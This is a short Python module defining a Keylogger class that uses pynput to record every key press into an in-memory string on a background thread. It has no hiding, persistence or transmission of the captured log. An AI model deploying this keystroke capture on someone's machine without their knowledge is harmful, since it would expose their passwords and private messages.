from pynput import keyboard
import threading
from typing import Optional


class Keylogger:
    def __init__(self) -> None:
        self._listener: Optional[keyboard.Listener] = None
        self._thread: Optional[threading.Thread] = None
        self.is_listening = False
        self.log = ""
        self._stop_event = threading.Event()

    def _on_press(self, key) -> None:
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            else:
                self.log += f"[{key.name}]"

    def _start_listener(self) -> None:
        with keyboard.Listener(on_press=self._on_press) as listener:
            self._listener = listener
            listener.join()

    def start(self) -> None:
        if not self.is_listening:
            self.is_listening = True
            self.log = ""
            self._thread = threading.Thread(target=self._start_listener)
            self._thread.start()

    def stop(self) -> None:
        if self.is_listening and self._listener:
            self.is_listening = False
            self._listener.stop()
            if self._thread:
                self._thread.join()

    def get_log(self) -> str:
        return self.log
